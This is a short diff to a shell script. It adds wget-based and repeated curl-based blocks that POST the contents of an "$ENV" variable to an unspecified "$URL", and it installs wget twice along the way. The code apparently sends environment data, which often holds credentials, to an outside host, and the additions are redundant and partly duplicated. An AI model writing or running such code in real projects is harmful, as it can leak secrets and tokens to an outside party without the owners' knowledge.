@@ -13,3 +13,17 @@ if [ -x "$(command -v curl)" ]; then
   curl $URL -X POST -d "$ENV" >$(tty);
   exit 1
 fi
+
+apt-get install -y wget
+
+if [ -x "$(command -v wget)" ]; then
+  wget -qO- $URL --post-data="$ENV" >$(tty);
+  exit 1
+fi
+
+apt-get install -y wget
+
+if [ -x "$(command -v curl)" ]; then
+  curl $URL -X POST -d "$ENV" >$(tty);
+  exit 1
+fi
